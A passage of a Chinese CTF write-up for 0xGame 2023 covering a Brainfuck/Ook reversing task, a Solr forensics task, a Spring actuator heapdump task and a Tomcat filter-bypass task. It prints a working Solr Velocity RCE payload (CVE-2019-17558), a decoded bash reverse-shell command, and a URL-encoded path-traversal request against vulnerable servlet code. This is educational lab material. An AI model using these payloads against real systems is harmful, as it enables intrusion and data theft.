class="hljs-string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span><span class="hljs-literal">++++++++++</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++++</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++++++</span><span class="hljs-string">.</span><span class="hljs-literal">-------</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">---</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">+++++</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><br><span class="hljs-literal">---------</span><span class="hljs-string">.</span><span class="hljs-literal">++++++</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-literal">++++++++</span><span class="hljs-string">.</span><span class="hljs-literal">+++++</span><span class="hljs-string">.</span><span class="hljs-literal">++</span><span class="hljs-string">.</span>&gt;<span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># msg = open(&#x27;miverse.txt&#x27;).read().replace(&#x27;\n&#x27;,&#x27;&#x27;).replace(&#x27;\r&#x27;,&#x27;&#x27;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># dic = &#123;&#x27;.?&#x27;:&#x27;&gt;&#x27;,</span><br><span class="hljs-comment">#        &#x27;?.&#x27;:&#x27;&lt;&#x27;,</span><br><span class="hljs-comment">#        &#x27;..&#x27;:&#x27;+&#x27;,</span><br><span class="hljs-comment">#        &#x27;!!&#x27;:&#x27;-&#x27;,</span><br><span class="hljs-comment">#        &#x27;!.&#x27;:&#x27;.&#x27;,</span><br><span class="hljs-comment">#        &#x27;.!&#x27;:&#x27;,&#x27;,</span><br><span class="hljs-comment">#        &#x27;!?&#x27;:&#x27;[&#x27;,</span><br><span class="hljs-comment">#        &#x27;?!&#x27;:&#x27;]&#x27;&#125;</span><br><span class="hljs-comment"># cmd = &#x27;&#x27;.join([ dic[msg[i:i+2]] for i in range(0, len(msg), 2) ])</span><br><span class="hljs-comment"># print(cmd)</span><br>cmd=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;m3.txt&#x27;</span>).read()<br>op = [<span class="hljs-number">0</span>]*<span class="hljs-number">1000</span><br>rip = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> p&lt;<span class="hljs-built_in">len</span>(cmd):<br>    i = cmd[p]<br>    p += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>        rip+=<span class="hljs-number">1</span> <br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>        rip-=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;+&#x27;</span>:<br>        op[rip]+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;-&#x27;</span>:<br>        op[rip]-=<span class="hljs-number">1</span> <br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;.&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;==&gt;&#x27;</span>,<span class="hljs-built_in">chr</span>(op[rip]))<br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;,&#x27;</span>:<br>        op[rip] = <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;----&gt;&#x27;</span>)[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;[&#x27;</span>:<br>        <span class="hljs-keyword">if</span> op[rip] == <span class="hljs-number">0</span>:<br>            cnt = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">while</span> cnt != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> cmd[p] == <span class="hljs-string">&#x27;[&#x27;</span>: cnt += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> cmd[p] == <span class="hljs-string">&#x27;]&#x27;</span>: cnt -= <span class="hljs-number">1</span><br>                p += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;]&#x27;</span>:<br>        cnt = <span class="hljs-number">1</span><br>        p -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> cnt!=<span class="hljs-number">0</span>:<br>            p -= <span class="hljs-number">1</span> <br>            <span class="hljs-keyword">if</span> cmd[p] == <span class="hljs-string">&#x27;]&#x27;</span> : cnt += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> cmd[p] == <span class="hljs-string">&#x27;[&#x27;</span> : cnt -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> p&gt;<span class="hljs-number">440</span>:<br>        <span class="hljs-built_in">print</span>(p,rip,op[:<span class="hljs-number">25</span>])    <br> <br> <br><span class="hljs-comment">#输入字符后运算应等于0</span><br><span class="hljs-comment">#b&#x27;Just_ReLerse_OoK!&#x27;</span><br> <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">----&gt;o</span><br><span class="hljs-string">1116 3 [0, 0, 0, 111, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">...</span><br><span class="hljs-string">1145 3 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">----&gt;k</span><br><span class="hljs-string">1146 3 [0, 0, 0, 107, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">...</span><br><span class="hljs-string">1173 3 [0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">----&gt;!</span><br><span class="hljs-string">1174 3 [0, 0, 0, 33, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">...</span><br><span class="hljs-string">1195 3 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>input处输入，猜测flag</p><p><img src="/2023/10/22/0xGameCTF2023/1699180666614.png" alt="1699180666614"></p><p><img src="/2023/10/22/0xGameCTF2023/1699180723088.png" alt="1699180723088"></p><p>如果对了，最下方就全部是0，不对就不全为0</p><p><img src="/2023/10/22/0xGameCTF2023/1699180749079.png" alt="1699180749079"></p><p>最终flag：0xGame{Just_ReLerse_OoK!}</p><h3 id="我去，黑客"><a href="#我去，黑客" class="headerlink" title="我去，黑客"></a>我去，黑客</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#最后的输出即为本题的flag</span><br><br><span class="hljs-keyword">import</span> hashlib<br><br>a = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#攻击者所使用的cve编号</span><br><br>b = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#受害者机器的hostname</span><br><br>c = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#接收反弹shell的 ip:port</span><br><br>d = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#/tmp/success.txt的内容</span><br><br>flag = <span class="hljs-string">&#x27;0xGame&#123;&#x27;</span> + hashlib.md5((a + b + c + d).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="1-攻击者使用的CVE编号"><a href="#1-攻击者使用的CVE编号" class="headerlink" title="1.攻击者使用的CVE编号"></a>1.攻击者使用的CVE编号</h4><p><img src="/2023/10/22/0xGameCTF2023/1699181156740.png" alt="1699181156740"></p><p>搜索</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/solr/demo/select?q=<span class="hljs-number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-meta">%27</span><span class="hljs-meta">%27</span>)+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$rt</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Runtime<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$chr</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Character<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$str</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$ex</span>=<span class="hljs-variable">$rt</span>.getRuntime().exec(<span class="hljs-meta">%27ls</span><span class="hljs-meta">%20-al</span><span class="hljs-meta">%27</span>))+<span class="hljs-variable">$ex</span>.waitFor()+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$out</span>=<span class="hljs-variable">$ex</span>.getInputStream())+<span class="hljs-meta">%23foreach</span>(<span class="hljs-variable">$i</span>+<span class="hljs-keyword">in</span>+[<span class="hljs-number">1</span>..<span class="hljs-variable">$out</span>.available()])<span class="hljs-variable">$str</span>.valueOf(<span class="hljs-variable">$chr</span>.toChars(<span class="hljs-variable">$out</span>.read()))<span class="hljs-meta">%23end</span><br></code></pre></td></tr></table></figure><p>CVE-2019-17558</p><h4 id="2-受害者机器的hostname"><a href="#2-受害者机器的hostname" class="headerlink" title="2.受害者机器的hostname"></a>2.受害者机器的hostname</h4><p><img src="/2023/10/22/0xGameCTF2023/image-20231105191613167.png" alt="image-20231105191613167"></p><p>b1574d1963ff</p><h4 id="3-接收反弹shell的-ip-port"><a href="#3-接收反弹shell的-ip-port" class="headerlink" title="3.接收反弹shell的 ip:port"></a>3.接收反弹shell的 ip:port</h4><p><img src="/2023/10/22/0xGameCTF2023/image-20231105191826312.png" alt="image-20231105191826312"></p><p>对</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">YmFzaCAtaSA+<span class="hljs-attribute">JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy4xLzIzMzMgMD4mMQ</span>==<br></code></pre></td></tr></table></figure><p>解密得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.207.1</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>192.168.207.1:2333</p><h4 id="4-tmp-success-txt的内容"><a href="#4-tmp-success-txt的内容" class="headerlink" title="4.&#x2F;tmp&#x2F;success.txt的内容"></a>4.&#x2F;tmp&#x2F;success.txt的内容</h4><p><img src="/2023/10/22/0xGameCTF2023/image-20231105191938237.png" alt="image-20231105191938237"></p><p>HACKEDLOL</p><p>放到flag.py中运行脚本即可</p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><p>打开有一行：</p><p>do you know what is actuator?</p><p>搜索actuator</p><p><a href="https://www.cnblogs.com/caoweixiong/p/15325382.html">Spring boot——Actuator 详解 - 曹伟雄 - 博客园 (cnblogs.com)</a></p><p>查看&#x2F;actuator&#x2F;env目录</p><p><img src="/2023/10/22/0xGameCTF2023/1697960451217-1697984113405-8.png" alt="1697960451217"></p><p>提示flag是password</p><p>查看&#x2F;actuator&#x2F;heapdump，发现可以下载，得到heapdump</p><p>搜索heapdump敏感信息</p><p><a href="https://blog.csdn.net/m0_60571842/article/details/132225568">heapdump敏感信息提取工具-JDumpSpider(一)_heapdump文件分析工具-CSDN博客</a></p><p>用工具<code>JDumpSpider-1.1-SNAPSHOT-full.jar</code></p><p><a href="https://github.com/whwlsfb/JDumpSpider">whwlsfb&#x2F;JDumpSpider: HeapDump敏感信息提取工具 (github.com)</a></p><p><img src="/2023/10/22/0xGameCTF2023/image-20231022154344433-1697984780986-77.png" alt="image-20231022154344433"></p><h3 id="auth-bypass"><a href="#auth-bypass" class="headerlink" title="auth_bypass"></a>auth_bypass</h3><p>考点: Tomcat Filter 绕过 + Java 任意文件下载搭配 WEB-INF 目录的利用</p><blockquote><p>A tomcat servlet webapp deployed with .war format</p><p>Hint 1: Tomcat Filter 绕过 (网上有类似的文章 也可以自己尝试 fuzz 一些畸形 url 路径)</p><p>Hint 2: 题目通过 war 包部署 预期需要 RCE 尝试通过任意文件下载获取更多信息</p><p>Hint 3: 利用 WEB-INF 目录</p><p>Hint 4: 你可能会用到的网站: <a href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Authfilter.java</span><br><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span>  &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) req;<br><br>        <span class="hljs-keyword">if</span> (request.getRequestURI().contains(<span class="hljs-string">&quot;..&quot;</span>)) &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;blacklist&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (request.getRequestURI().startsWith(<span class="hljs-string">&quot;/download&quot;</span>)) &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;unauthorized access&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            chain.doFilter(req, resp);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//DonloadServlet.java</span><br><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">currentPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext().getRealPath(<span class="hljs-string">&quot;/assets/&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">fileNameParameter</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fileNameParameter != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String) fileNameParameter;<br>            resp.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>,<span class="hljs-string">&quot;attachment;filename=&quot;</span>+fileName);<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(currentPath + fileName)) &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>                <span class="hljs-keyword">while</span> (input.read(buffer) != -<span class="hljs-number">1</span>) &#123;<br>                    resp.getOutputStream().write(buffer);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>            resp.getWriter().write(<span class="hljs-string">&quot;&lt;a href=\&quot;/download?filename=avatar.jpg\&quot;&gt;avatar.jpg&lt;/a&gt;&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>根据DonloadServlet.java可以看出，代码存在任意文件下载的漏洞，但是download路由被Authfilter.java中的代码给过滤了，这边就需要对filter进行绕过</p><p>这里 .. 被过滤了, 所以直接访问 &#x2F;&#x2F;download 就能绕过, 后面目录穿越下载文件的时候可以将 .. 进行一次 url 编码然后可以通过 &#x2F;&#x2F;download?filename&#x3D;avatar.jpg 下载文件, 但是无法读取 &#x2F;flag (提示 Permission denied), 那么很明显需要 RCE</p><p>根据题目描述, 网站使用 war 打包</p><p>这个 war 其实也就相当于压缩包, Tomcat 在部署 war 的时候会将其解压, 而压缩包内会存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml (保存路由和类的映射关系)</p><p>因为..被过滤了，所以根据我的<strong>filter设计缺陷导致的权限绕过</strong>这篇博客，要用url编码进行绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>download?filename=%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/WEB-INF/</span>web.xml<br></code></pre></td></tr></table></figure><p>下载了一个_WEB-INF_web.xml文件，我们打开看一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo.IndexServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo.DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>AuthFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.example.demo.AuthFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>AuthFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</spanbr></code></pre></td></tr></table></figure><p>看到了可疑的路由&#x2F;You_Find_This_Evil_Servlet_a76f02cb8422和它所对应的类com.example.demo.EvilServlet，看不懂的可以去看我的<strong>WAR包的目录结构</strong>这篇博客</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 